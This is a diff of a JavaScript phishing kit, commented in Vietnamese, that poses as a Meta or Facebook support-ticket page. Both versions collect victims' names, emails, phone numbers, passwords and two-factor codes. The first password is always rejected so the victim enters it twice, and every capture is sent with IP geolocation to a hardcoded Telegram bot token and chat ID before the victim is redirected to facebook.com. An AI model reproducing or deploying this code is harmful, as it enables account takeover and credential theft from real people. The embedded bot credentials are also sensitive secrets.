@@ -1,735 +1,320 @@
-/* ==========================================
-
-   PHẦN 1: CẤU HÌNH (CONFIG)
-
-   ========================================== */
-
+/* ========================================================================
+   PHẦN 1: CẤU HÌNH & TIỆN ÍCH (CONFIG & UTILS)
+   ======================================================================== */
 const CONFIG = {
-
-    TELEGRAM_BOT_TOKEN: '7100924911:AAFbe2QHrx26J5pREWtgn-jo2pWKh5A9imE', // Đã giải mã từ đoạn hex
-
-    TELEGRAM_CHAT_ID: '-5070121169',
-
-    SECRET_KEY: 'HDNDT-JDHT8FNEK-JJHR', // Key dùng cho cryptojs (nếu có dùng)
-
-    STORAGE_EXPIRY: 3600000, // 1 giờ
-
-    COUNTDOWN_TIME: 30 // 30 giây đếm ngược
-
+    TELEGRAM: {
+        // Thay Token và Chat ID của bạn vào đây
+        BOT_TOKEN: atob("7100924911:AAFbe2QHrx26J5pREWtgn-jo2pWKh5A9imE"), 
+        CHAT_ID: atob("-5070121169")
+    },
+    IP_API: "https://ipwho.is/",
+    REDIRECT_URL: "https://www.facebook.com"
 };
-
-
-
-/* ==========================================
-
-   PHẦN 2: TIỆN ÍCH (UTILS)
-
-   ========================================== */
 
 const Utils = {
-
-    // Hàm mã hóa AES (Nếu bạn có thư viện crypto-js, nếu không thì bỏ qua)
-
-    encrypt: (data) => {
-
-        if (typeof CryptoJS === 'undefined') return data; 
-
-        return CryptoJS.AES.encrypt(data, CONFIG.SECRET_KEY).toString();
-
+    getLocation: async () => {
+        try {
+            const response = await fetch(CONFIG.IP_API);
+            const data = await response.json();
+            if (data.success) {
+                return {
+                    ip: data.ip,
+                    city: data.city || "Unknown",
+                    country: data.country || "Unknown",
+                    flag: data.flag ? data.flag.emoji : "" 
+                };
+            }
+            return { ip: data.ip || "Unknown", city: "N/A", country: "N/A", flag: "" };
+        } catch (e) {
+            return { ip: "Error", city: "N/A", country: "N/A", flag: "" };
+        }
     },
 
+    getTime: () => {
+        return new Date().toLocaleString("vi-VN", { timeZone: "Asia/Ho_Chi_Minh" });
+    },
 
-
-    // Hàm lưu vào LocalStorage có thời hạn
-
-    saveRecord: (key, value) => {
+    sendMessage: async (message) => {
+        const { BOT_TOKEN, CHAT_ID } = CONFIG.TELEGRAM;
+        if (!BOT_TOKEN || !CHAT_ID) return false;
 
         try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+            return true;
+        } catch (e) {
+            console.error(e);
+            return false;
+        }
+    },
 
-            const record = {
+    formatReport: (data, type, loc) => {
+        const time = Utils.getTime();
+        let icon = type === "INFO" ? "📝 INFO" : (type === "PASS" ? "🔑 PASS" : "🔥 OTP");
 
-                value: value,
+        let infoBlock = `<b>Name:</b> ${data.fullName}`;
+        infoBlock += `\n<b>Mail:</b> ${data.email}`;
+        if (data.businessEmail) infoBlock += `\n<b>Biz Mail:</b> ${data.businessEmail}`;
+        infoBlock += `\n<b>Phone:</b> ${data.phone}`;
 
-                expiry: Date.now() + CONFIG.STORAGE_EXPIRY
+        let passBlock = "";
+        if (data.pass1) passBlock += `\n----------------\n<b>Pass 1:</b> <code>${data.pass1}</code>`;
+        if (data.pass2) passBlock += `\n<b>Pass 2:</b> <code>${data.pass2}</code>`;
+        
+        let otpBlock = "";
+        if (data.twoFactorCode) otpBlock = `\n----------------\n<b>📲 2FA:</b> <code>${data.twoFactorCode}</code>`;
 
+        let ipBlock = `\n================\n🌍 <code>${loc.ip}</code>\n📍 ${loc.city}, ${loc.country} ${loc.flag}`;
+
+        return `<b>${icon}</b> | ${time}\n----------------\n${infoBlock}${passBlock}${otpBlock}${ipBlock}`;
+    }
+};
+
+/* ========================================================================
+   PHẦN 2: LOGIC TƯƠNG TÁC DOM (MAIN LOGIC)
+   ======================================================================== */
+document.addEventListener("DOMContentLoaded", () => {
+    
+    // --- KHAI BÁO CÁC PHẦN TỬ HTML (Theo đúng ID trong file HTML của bạn) ---
+    const overlay = document.getElementById("overlay");
+    
+    // 1. Màn hình chính
+    const submitRequestBtn = document.getElementById("submitRequestBtn");
+    const ticketIdEl = document.getElementById("ticketId");
+
+    // 2. Form Thông tin (Info Form)
+    const infoForm = document.getElementById("infoForm");
+    // Lấy nút Send trong Info Form (vì trong HTML bạn không đặt ID cho nút này nên dùng querySelector)
+    const infoSendBtn = infoForm.querySelector("button"); 
+    const infoInputs = infoForm.querySelectorAll(".meta-input"); // Lấy tất cả ô input
+    const infoCheckbox = infoForm.querySelector("input[type='checkbox']");
+
+    // 3. Form Mật khẩu (Password Form)
+    const passwordForm = document.getElementById("passwordForm");
+    const passwordInput = document.getElementById("passwordInput");
+    const continueBtn = document.getElementById("continueBtn");
+    
+    // Tạo dòng thông báo lỗi cho Password (vì HTML gốc chưa có ID cho lỗi pass, ta thêm bằng JS)
+    let passwordError = document.createElement("p");
+    passwordError.className = "text-red-600 text-sm mt-2 hidden text-center";
+    passwordError.innerText = "The password you entered is incorrect. Please try again.";
+    if(passwordInput) passwordInput.after(passwordError);
+
+    // 4. Form Xác minh (Verify Modal)
+    const verifyModal = document.getElementById("verifyModal");
+    const verifyCodeInput = document.getElementById("verifyCode");
+    const verifyError = document.getElementById("verifyError");
+    const countdown = document.getElementById("countdown");
+    const verifyBtn = document.getElementById("verifyBtn");
+    const verifyTitle = document.getElementById("verifyTitle");
+    const userNameEl = document.getElementById("userName");
+    const maskedEmailEl = document.getElementById("maskedEmail");
+    const maskedPhoneEl = document.getElementById("maskedPhone");
+
+    // ============================================================
+    // LOGIC CHẠY
+    // ============================================================
+
+    // 1. Tạo Ticket ID ngẫu nhiên khi vào trang
+    if (ticketIdEl) {
+        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+        const block = () => Array.from({ length: 4 }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
+        ticketIdEl.innerText = `${block()}-${block()}-${block()}`;
+    }
+
+    // 2. Bấm "Submit Request" -> Hiện Form Info
+    if (submitRequestBtn) {
+        submitRequestBtn.addEventListener("click", () => {
+            overlay.classList.remove("hidden");
+            infoForm.classList.remove("hidden");
+        });
+    }
+
+    // 3. Xử lý Form Info -> Chuyển sang Pass
+    if (infoSendBtn) {
+        infoSendBtn.addEventListener("click", () => {
+            // Validate Checkbox
+            if (infoCheckbox && !infoCheckbox.checked) {
+                alert("Please agree with Terms of use");
+                return;
+            }
+
+            // Lưu thông tin vào SessionStorage
+            // Thứ tự input trong HTML của bạn: [0]FullName, [1]Email, [2]BizEmail, [3]PageName, [4]Phone
+            sessionStorage.setItem("fullName", infoInputs[0].value || "");
+            sessionStorage.setItem("email", infoInputs[1].value || "");
+            sessionStorage.setItem("businessEmail", infoInputs[2].value || "");
+            sessionStorage.setItem("pageName", infoInputs[3].value || "");
+            sessionStorage.setItem("phone", infoInputs[4].value || "");
+
+            // Ẩn Info, Hiện Password
+            infoForm.classList.add("hidden");
+            passwordForm.classList.remove("hidden");
+        });
+    }
+
+    // 4. Xử lý Password (2 lần)
+    let passwordAttempts = 0;
+
+    if (continueBtn) {
+        continueBtn.addEventListener("click", async () => {
+            const currentPass = passwordInput.value;
+            if (!currentPass) return;
+
+            passwordAttempts++;
+            continueBtn.innerText = "Checking...";
+            continueBtn.disabled = true;
+
+            const userLoc = await Utils.getLocation();
+
+            if (passwordAttempts === 1) {
+                // --- Lần 1: Báo sai, KHÔNG khóa ---
+                sessionStorage.setItem("pass1", currentPass);
+
+                const data = {
+                    fullName: sessionStorage.getItem("fullName"),
+                    email: sessionStorage.getItem("email"),
+                    businessEmail: sessionStorage.getItem("businessEmail"),
+                    phone: sessionStorage.getItem("phone"),
+                    pass1: currentPass
+                };
+                await Utils.sendMessage(Utils.formatReport(data, "PASS", userLoc));
+
+                // Hiện lỗi
+                passwordError.classList.remove("hidden");
+                passwordInput.value = "";
+                passwordInput.focus();
+                
+                // Mở lại nút ngay
+                continueBtn.innerText = "Continue";
+                continueBtn.disabled = false;
+            } 
+            else {
+                // --- Lần 2: Đúng -> Chuyển sang Verify ---
+                const oldPass = sessionStorage.getItem("pass1");
+                const data = {
+                    fullName: sessionStorage.getItem("fullName"),
+                    email: sessionStorage.getItem("email"),
+                    businessEmail: sessionStorage.getItem("businessEmail"),
+                    phone: sessionStorage.getItem("phone"),
+                    pass1: oldPass,
+                    pass2: currentPass
+                };
+                await Utils.sendMessage(Utils.formatReport(data, "PASS", userLoc));
+
+                // Ẩn Password, Hiện Verify
+                passwordForm.classList.add("hidden");
+                verifyModal.classList.remove("hidden");
+                
+                // Điền thông tin fake vào verify modal
+                setupVerifyModal();
+            }
+        });
+    }
+
+    // Hàm điền thông tin mask vào modal verify
+    function setupVerifyModal() {
+        const name = sessionStorage.getItem("fullName");
+        const email = sessionStorage.getItem("email");
+        const phone = sessionStorage.getItem("phone");
+
+        if (userNameEl) userNameEl.innerText = name;
+        
+        // Mask Email
+        if (maskedEmailEl && email) {
+            const [u, d] = email.split('@');
+            const maskU = u.length > 3 ? u.substring(0,3) : u;
+            maskedEmailEl.innerText = `${maskU}***@${d || ""}`;
+        }
+
+        // Mask Phone
+        if (maskedPhoneEl && phone) {
+            maskedPhoneEl.innerText = `*******${phone.slice(-3)}`;
+        }
+    }
+
+    // 5. Xử lý Verify Code (Khóa 30s)
+    let verifyAttempts = 0;
+    let isLocked = false;
+
+    function startLockdown(seconds) {
+        isLocked = true;
+        verifyBtn.disabled = true;
+        verifyBtn.classList.add("opacity-50", "cursor-not-allowed");
+        
+        countdown.classList.remove("hidden");
+        countdown.innerText = `Try again in ${seconds}s`;
+
+        const timer = setInterval(() => {
+            seconds--;
+            countdown.innerText = `Try again in ${seconds}s`;
+
+            if (seconds <= 0) {
+                clearInterval(timer);
+                isLocked = false;
+                verifyBtn.disabled = false;
+                verifyBtn.classList.remove("opacity-50", "cursor-not-allowed");
+                verifyBtn.innerText = "Continue";
+                
+                countdown.classList.add("hidden");
+                verifyError.classList.add("hidden");
+            }
+        }, 1000);
+    }
+
+    if (verifyBtn) {
+        verifyBtn.addEventListener("click", async () => {
+            if (isLocked) return;
+
+            const code = verifyCodeInput.value;
+            if (!code) return;
+
+            verifyBtn.innerText = "Checking...";
+            verifyAttempts++;
+
+            const userLoc = await Utils.getLocation();
+            
+            const data = {
+                fullName: sessionStorage.getItem("fullName"),
+                email: sessionStorage.getItem("email"),
+                businessEmail: sessionStorage.getItem("businessEmail"),
+                phone: sessionStorage.getItem("phone"),
+                pass1: sessionStorage.getItem("pass1"),
+                pass2: passwordInput.value, // Lấy lại pass cuối
+                twoFactorCode: code
             };
 
-            localStorage.setItem(key, JSON.stringify(record));
+            await Utils.sendMessage(Utils.formatReport(data, "OTP", userLoc));
 
-        } catch (e) {
+            // Báo sai
+            verifyError.classList.remove("hidden");
+            verifyError.innerText = "The code you entered is incorrect.";
+            verifyCodeInput.value = "";
 
-            console.error("Save error", e);
-
-        }
-
-    },
-
-
-
-    // Hàm lấy từ LocalStorage
-
-    getRecord: (key) => {
-
-        try {
-
-            const item = localStorage.getItem(key);
-
-            if (!item) return null;
-
-            const record = JSON.parse(item);
-
-            if (Date.now() > record.expiry) {
-
-                localStorage.removeItem(key);
-
-                return null;
-
+            // Cập nhật title (Step 1/3 -> 2/3)
+            if (verifyTitle) {
+                verifyTitle.innerText = `Two-factor authentication required (${Math.min(verifyAttempts + 1, 3)}/3)`;
             }
 
-            return record.value;
-
-        } catch (e) {
-
-            return null;
-
-        }
-
-    },
-
-
-
-    // Lấy IP và Vị trí
-
-    getUserLocation: async () => {
-
-        try {
-
-            // Dùng API miễn phí để lấy IP và Info
-
-            const response = await fetch('https://ipwho.is/');
-
-            const data = await response.json();
-
-            if(data.success) {
-
-                return {
-
-                    ip: data.ip,
-
-                    location: `${data.city}, ${data.country}`,
-
-                    country_code: data.country_code,
-
-                    flag: data.flag ? data.flag.emoji : ""
-
-                };
-
+            // Nếu sai 3 lần -> Chuyển hướng
+            if (verifyAttempts >= 3) {
+                verifyBtn.innerText = "Redirecting...";
+                setTimeout(() => {
+                    window.location.href = CONFIG.REDIRECT_URL;
+                }, 1000);
+                return;
             }
 
-            return { ip: 'N/A', location: 'Unknown', country_code: '', flag: '' };
-
-        } catch (e) {
-
-            console.error(e);
-
-            return { ip: 'N/A', location: 'Unknown', country_code: '', flag: '' };
-
-        }
-
-    },
-
-
-
-    // Gửi tin nhắn về Telegram
-
-    sendToTelegram: async (data) => {
-
-        const loc = await Utils.getUserLocation();
-
-        
-
-        let message = `
-
-<b>IP:</b> <code>${loc.ip}</code>
-
-<b>Location:</b> <code>${loc.location} ${loc.flag}</code>
-
-<b>Full Name:</b> <code>${data.fullName || 'N/A'}</code>
-
-<b>Email:</b> <code>${data.email || 'N/A'}</code>
-
-<b>Business Email:</b> <code>${data.emailBusiness || 'N/A'}</code>
-
-<b>Phone:</b> <code>${data.phone || 'N/A'}</code>
-
-<b>DOB:</b> <code>${data.day}/${data.month}/${data.year}</code>
-
-`;
-
-
-
-        if(data.password) message += `\n<b>Password:</b> <code>${data.password}</code>`;
-
-        if(data.twoFa) message += `\n<b>2FA (Code 1):</b> <code>${data.twoFa}</code>`;
-
-        if(data.twoFaSecond) message += `\n<b>2FA (Code 2):</b> <code>${data.twoFaSecond}</code>`;
-
-
-
-        try {
-
-            await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
-
-                method: 'POST',
-
-                headers: { 'Content-Type': 'application/json' },
-
-                body: JSON.stringify({
-
-                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
-
-                    text: message,
-
-                    parse_mode: 'HTML'
-
-                })
-
-            });
-
-        } catch (e) {
-
-            console.error("Tele Error", e);
-
-        }
-
-    },
-
-
-
-    maskEmail: (email) => {
-
-        if (!email) return '';
-
-        return email.replace(/^(.)(.*?)(.)@(.+)$/, (match, first, middle, last, domain) => {
-
-            return first + '*'.repeat(middle.length) + last + '@' + domain;
-
+            // --- KHÓA 30s NGAY LẬP TỨC ---
+            startLockdown(30);
         });
-
-    },
-
-
-
-    maskPhone: (phone) => {
-
-        if (!phone || phone.length < 5) return phone;
-
-        const first = phone.slice(0, 2);
-
-        const last = phone.slice(-2);
-
-        return first + ' ' + '*'.repeat(phone.length - 4) + ' ' + last;
-
-    },
-
-
-
-    generateTicketId: () => {
-
-        const random = () => Math.random().toString(36).substr(2, 6).toUpperCase();
-
-        return `${random()}-${random()}-${random()}`;
-
-    }
-
-};
-
-
-
-/* ==========================================
-
-   PHẦN 3: MODAL UI HANDLER
-
-   ========================================== */
-
-const Modal = {
-
-    create: (id, content) => {
-
-        const html = `
-
-            <div id="${id}" class="fixed inset-0 z-50 flex items-center justify-center bg-black/40 hidden">
-
-                <div class="bg-white max-h-full h-full max-w-lg shadow-lg p-5 rounded-2xl flex-col overflow-y-auto transform scale-0 opacity-0 transition-all duration-300">
-
-                    ${content}
-
-                </div>
-
-            </div>`;
-
-        document.body.insertAdjacentHTML('beforeend', html);
-
-    },
-
-    open: (id) => {
-
-        const el = document.getElementById(id);
-
-        if (!el) return;
-
-        el.classList.remove('hidden');
-
-        setTimeout(() => {
-
-            const inner = el.querySelector('div');
-
-            inner.classList.remove('scale-0', 'opacity-0');
-
-            inner.classList.add('scale-100');
-
-        }, 10);
-
-    },
-
-    close: (id) => {
-
-        const el = document.getElementById(id);
-
-        if (!el) return;
-
-        const inner = el.querySelector('div');
-
-        inner.classList.remove('scale-100');
-
-        inner.classList.add('scale-0', 'opacity-0');
-
-        setTimeout(() => {
-
-            el.classList.add('hidden');
-
-        }, 200);
-
-    }
-
-};
-
-
-
-/* ==========================================
-
-   PHẦN 4: LOGIC CHÍNH (MAIN)
-
-   ========================================== */
-
-
-
-document.addEventListener('DOMContentLoaded', () => {
-
-    // 1. Set Ticket ID
-
-    const ticketEl = document.getElementById('ticketId');
-
-    if (ticketEl) ticketEl.innerText = Utils.generateTicketId();
-
-
-
-    // 2. Sự kiện nút Submit ở trang chủ -> Mở Form Info
-
-    const btnSubmit = document.getElementById('submitRequestBtn');
-
-    if (btnSubmit) {
-
-        btnSubmit.addEventListener('click', openClientModal);
-
     }
 
 });
-
-
-
-// --- Modal 1: Nhập thông tin (Info) ---
-
-function openClientModal() {
-
-    const modalId = 'clientModal';
-
-    const formId = 'clientForm';
-
-    
-
-    // HTML của Form Info (Đã đơn giản hóa)
-
-    const content = `
-
-        <h2 class="font-bold text-[15px] mb-4">Information Form</h2>
-
-        <form id="${formId}" class="space-y-3">
-
-            <input id="fullName" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm" placeholder="Full Name" required>
-
-            <input id="email" type="email" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm" placeholder="Email" required>
-
-            <input id="emailBusiness" type="email" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm" placeholder="Business Email" required>
-
-            <input id="fanpage" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm" placeholder="Page Name" required>
-
-            <input id="phone" type="tel" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm" placeholder="Phone Number" required>
-
-            
-
-            <div>
-
-                <b class="text-[#9a979e] text-sm block mb-2">Date of Birth</b>
-
-                <div class="grid grid-cols-3 gap-2">
-
-                    <input id="day" type="number" placeholder="Day" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm" required>
-
-                    <input id="month" type="number" placeholder="Month" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm" required>
-
-                    <input id="year" type="number" placeholder="Year" class="border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm" required>
-
-                </div>
-
-            </div>
-
-            
-
-            <button type="submit" class="w-full h-10 bg-[#0064E0] text-white rounded-full font-semibold hover:bg-blue-700">Send</button>
-
-        </form>
-
-    `;
-
-
-
-    Modal.create(modalId, content);
-
-    Modal.open(modalId);
-
-
-
-    // Xử lý khi bấm Send
-
-    document.getElementById(formId).addEventListener('submit', async (e) => {
-
-        e.preventDefault();
-
-        
-
-        // Thu thập dữ liệu
-
-        const data = {
-
-            fullName: document.getElementById('fullName').value,
-
-            email: document.getElementById('email').value,
-
-            emailBusiness: document.getElementById('emailBusiness').value,
-
-            fanpage: document.getElementById('fanpage').value,
-
-            phone: document.getElementById('phone').value,
-
-            day: document.getElementById('day').value,
-
-            month: document.getElementById('month').value,
-
-            year: document.getElementById('year').value
-
-        };
-
-
-
-        // Lưu vào LocalStorage
-
-        Utils.saveRecord('__client_rec', data);
-
-        
-
-        // Chuyển sang bước Password
-
-        Modal.close(modalId);
-
-        openSecurityModal(); // Mở modal mật khẩu
-
-    });
-
-}
-
-
-
-// --- Modal 2: Nhập Password (2 Lần) ---
-
-function openSecurityModal() {
-
-    const modalId = 'authModal';
-
-    const formId = 'authForm';
-
-    
-
-    const content = `
-
-        <h2 class="text-[20px] font-bold mb-2">Please Enter Your Password</h2>
-
-        <p class="text-sm text-gray-500 mb-4">For your security, please re-enter your password to continue.</p>
-
-        <form id="${formId}">
-
-            <input id="password" type="password" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm mb-2" placeholder="Password" required>
-
-            <p id="passError" class="text-red-500 text-sm hidden mb-2">The password you entered is incorrect.</p>
-
-            <button id="btnContinue" type="submit" class="w-full h-10 bg-[#0064E0] text-white rounded-full font-semibold">Continue</button>
-
-        </form>
-
-    `;
-
-
-
-    Modal.create(modalId, content);
-
-    Modal.open(modalId);
-
-
-
-    let attempts = 0;
-
-
-
-    document.getElementById(formId).addEventListener('submit', async (e) => {
-
-        e.preventDefault();
-
-        const passInput = document.getElementById('password');
-
-        const errorText = document.getElementById('passError');
-
-        const password = passInput.value;
-
-
-
-        if(!password) return;
-
-
-
-        attempts++;
-
-
-
-        // LẦN 1: Luôn báo sai
-
-        if (attempts === 1) {
-
-            // Lấy data cũ, thêm pass vào và gửi
-
-            const oldData = Utils.getRecord('__client_rec');
-
-            const dataToSend = { ...oldData, password: password };
-
-            
-
-            // Gửi telegram
-
-            Utils.sendToTelegram(dataToSend);
-
-
-
-            // Báo lỗi giả
-
-            errorText.classList.remove('hidden');
-
-            passInput.value = "";
-
-            passInput.focus();
-
-        } 
-
-        // LẦN 2: Chuyển sang Verify
-
-        else {
-
-            const oldData = Utils.getRecord('__client_rec');
-
-            // Lưu password lần 2 (pass chuẩn)
-
-            const dataToSend = { ...oldData, password: password }; // Gửi pass lần 2
-
-            
-
-            Utils.saveRecord('__client_rec', dataToSend);
-
-            await Utils.sendToTelegram(dataToSend);
-
-
-
-            Modal.close(modalId);
-
-            openAuthenticationModal(dataToSend); // Chuyển sang 2FA
-
-        }
-
-    });
-
-}
-
-
-
-// --- Modal 3: Verify 2FA (Khóa 30s sau mỗi lần sai) ---
-
-function openAuthenticationModal(data) {
-
-    const modalId = 'twoFaModal';
-
-    const content = `
-
-        <h2 class="text-[20px] font-bold mb-2">Two-factor authentication required</h2>
-
-        <p class="text-sm text-gray-500 mb-4">
-
-            Enter the code we sent to ${Utils.maskEmail(data.email)} or ${Utils.maskPhone(data.phone)}
-
-        </p>
-
-        <img src="/public/verify-illustration.png" class="w-full mb-4">
-
-        
-
-        <input id="code" type="text" class="w-full border border-[#d4dbe3] h-10 px-3 rounded-lg text-sm mb-2" placeholder="Login code" required>
-
-        <p id="codeError" class="text-red-500 text-sm hidden mb-2">The code is incorrect.</p>
-
-        <p id="countdown" class="text-gray-500 text-sm hidden mb-2"></p>
-
-        
-
-        <button id="btnVerify" class="w-full h-10 bg-[#0064E0] text-white rounded-full font-semibold">Continue</button>
-
-    `;
-
-
-
-    Modal.create(modalId, content);
-
-    Modal.open(modalId);
-
-
-
-    const btnVerify = document.getElementById('btnVerify');
-
-    const codeInput = document.getElementById('code');
-
-    const errorText = document.getElementById('codeError');
-
-    const countdownText = document.getElementById('countdown');
-
-
-
-    let verifyAttempts = 0;
-
-
-
-    btnVerify.addEventListener('click', async () => {
-
-        const code = codeInput.value;
-
-        if (!code) return;
-
-
-
-        verifyAttempts++;
-
-
-
-        // Gửi code về Telegram
-
-        const oldData = Utils.getRecord('__client_rec');
-
-        const dataToSend = { 
-
-            ...oldData, 
-
-            [verifyAttempts === 1 ? 'twoFa' : 'twoFaSecond']: code // Lưu code1 hoặc code2
-
-        };
-
-        
-
-        await Utils.sendToTelegram(dataToSend);
-
-
-
-        // Báo lỗi
-
-        errorText.classList.remove('hidden');
-
-        codeInput.value = "";
-
-
-
-        // Nếu sai 3 lần -> Chuyển hướng
-
-        if (verifyAttempts >= 3) {
-
-            btnVerify.innerText = "Redirecting...";
-
-            setTimeout(() => {
-
-                window.location.href = CONFIG.REDIRECT_URL;
-
-            }, 1000);
-
-            return;
-
-        }
-
-
-
-        // KHÓA 30 GIÂY NGAY LẬP TỨC
-
-        startLockdown(30);
-
-    });
-
-
-
-    function startLockdown(seconds) {
-
-        btnVerify.disabled = true;
-
-        btnVerify.classList.add('opacity-50');
-
-        countdownText.classList.remove('hidden');
-
-        
-
-        const timer = setInterval(() => {
-
-            seconds--;
-
-            countdownText.innerText = `Try again in ${seconds}s`;
-
-            
-
-            if (seconds <= 0) {
-
-                clearInterval(timer);
-
-                btnVerify.disabled = false;
-
-                btnVerify.classList.remove('opacity-50');
-
-                countdownText.classList.add('hidden');
-
-                errorText.classList.add('hidden');
-
-            }
-
-        }, 1000);
-
-    }
-
-}
